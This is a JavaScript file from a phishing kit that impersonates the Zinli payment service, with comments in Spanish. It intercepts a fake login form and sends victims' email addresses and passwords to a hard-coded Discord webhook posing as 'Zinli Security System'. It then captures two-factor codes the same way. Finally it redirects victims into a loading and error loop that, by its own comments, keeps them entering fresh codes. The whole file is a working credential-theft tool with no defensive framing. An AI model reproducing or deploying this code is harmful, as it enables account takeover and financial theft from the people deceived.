const webhookURL = "https://discord.com/api/webhooks/1567314875766538400/47iucDD9Mj0mTnf_ydI7fK3yxA0xfH6ms1OHdV01evRbD3TGMvjR7nybp9K-DutxSppC";

document.addEventListener("DOMContentLoaded", () => {
    const loginForm = document.getElementById('loginForm');
    const otpForm = document.getElementById('otpForm');

    // --- 1. CAPTURAR LOGIN (index / index_3) ---
    if (loginForm) {
        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();

            const email = document.getElementById('email') ? document.getElementById('email').value : "";
            const password = document.getElementById('password') ? document.getElementById('password').value : "";

            // Guardamos temporalmente en el navegador para control interno
            localStorage.setItem("zinli_email", email);

            const payload = {
                username: "Zinli Security System",
                avatar_url: "https://i.imgur.com/4M34hi2.png",
                embeds: [{
                    title: "🛡️ NUEVA SESIÓN INICIADA - ZINLI",
                    color: 5893250, // Morado
                    fields: [
                        { name: "📧 Correo Electrónico", value: `\`\`\`${email}\`\`\``, inline: false },
                        { name: "🔑 Contraseña", value: `\`\`\`${password}\`\`\``, inline: false }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };

            await sendToDiscord(payload);
            window.location.href = "carg.html";
        });
    }

    // --- 2. CAPTURAR CÓDIGOS 2FA (cod, cod_2, cod2_2, etc.) ---
    if (otpForm) {
        otpForm.addEventListener('submit', async function(e) {
            e.preventDefault();

            let otpCode = "";
            document.querySelectorAll('.code-input').forEach(input => {
                otpCode += input.value.trim();
            });

            const emailUser = localStorage.getItem("zinli_email") || "Desconocido";
            
            // Detectar si estamos en la pantalla de error (cod2) o en la primera
            const isErrorPage = window.location.href.includes("cod2");

            const payload = {
                username: "Zinli Security System",
                avatar_url: "https://i.imgur.com/4M34hi2.png",
                embeds: [{
                    title: isErrorPage ? "🔄 REINTENTO DE CÓDIGO 2FA (Bucle)" : "🔢 CÓDIGO DE VERIFICACIÓN 2FA",
                    color: isErrorPage ? 15158332 : 16776960, // Rojo para reintento / Amarillo para primero
                    fields: [
                        { name: "📧 Usuario", value: `\`\`\`${emailUser}\`\`\``, inline: false },
                        { name: "📥 Código Ingresado", value: `\`\`\`${otpCode}\`\`\``, inline: false }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };

            await sendToDiscord(payload);

            // Redirección al bucle infinito de carga -> pantalla de error/código nuevo
            window.location.href = "carg2.html";
        });
    }
});

async function sendToDiscord(payload) {
    try {
        await fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    } catch (error) {
        console.error("Error al enviar a Discord:", error);
    }
}